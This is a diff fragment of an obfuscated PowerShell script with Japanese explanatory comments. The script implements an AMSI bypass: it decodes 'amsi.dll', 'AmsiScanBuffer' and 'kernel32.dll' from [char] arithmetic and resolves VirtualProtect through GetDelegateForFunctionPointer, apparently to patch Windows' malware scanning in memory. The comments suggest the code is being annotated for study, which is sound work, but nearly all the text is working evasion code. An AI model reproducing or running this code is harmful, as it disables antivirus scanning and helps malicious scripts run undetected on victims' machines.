@@ -188,6 +188,7 @@ FUncTIon Get-iy2kysa7yS {
 # TypeBuilderクラスのCreateType()メソッドで、オブジェクトを作成
     return $WQvsFMfB0c.CreateTYpe()
 }
+
 #jump
 # 「Get-PZ2zmpurexnDXVSxx $amsi.dll $AmsiScanBuffer」を実行し、「AmsiScanBuffer」プロセスのアドレスを取得
 [IntPtr]$jdemwXeK2wnWhB = Get-PZ2zmpurexnDXVSxx $(""+[char](2099-2002)+[ChAr](5453-5344)+[CHar]([bytE] 0xb5-0x42)+[Char]([Byte] 0xdf-0x76)+[chAr]([BYTE] 0x4d-0x1f)+[chAR](2502-2402)+[chAR](749-641)+[cHar]([BytE] 0x91-0x25)+"") $(""+[ChAr](3160-3095)+[cHaR]([BYtE] 0xdc-0x6f)+[cHar](6716-6601)+[chAR]([ByTe] 0xdf-0x76)+[Char](7170-7087)+[ChAr]([BYtE] 0xd5-0x72)+[cHAR](6847-6750)+[chaR](2526-2416)+[cHAr](3598-3532)+[char](7822-7705)+[ChAr](377-275)+[cHar](3259-3157)+[chaR](7660-7559)+[cHar](4473-4359)+"")
@@ -195,6 +196,8 @@ FUncTIon Get-iy2kysa7yS {
 $N7IBEcG01XRRln = 0
 #jump
 # 「Get-PZ2zmpurexnDXVSxx $kernel32.dll  VirtualProtect」でk「VirtualProtect」プロセスのアドレスを取得
+# 「Get-iy2kysa7yS」で動的アセンブリを作成
+# System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer()メソッドでアンマネージ関数ポインターをデリゲートに変換する。
 $knBIRuLz=[SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::GETDElEgaTEForFUNCtionPOiNTeR(
     (Get-PZ2zmpurexnDXVSxx $(""+[ChAR](577-470)+[ChaR](2547-2446)+[cHar](5679-5565)+[chAr](6260-6150)+[cHAr](4851-4750)+[ChAr](3338-3230)+[char](9887-9836)+[Char]([bYTe] 0x77-0x45)+[CHAR](4271-4225)+[cHar](7885-7785)+[cHAR]([bytE] 0xdc-0x70)+[ChAR](1500-1392)+"") VirtualProtect), 
     (Get-iy2kysa7yS @([IntPtr], [UInt32], [UInt32], [UInt32].MAkeBYREFTypE()) ([Bool]))
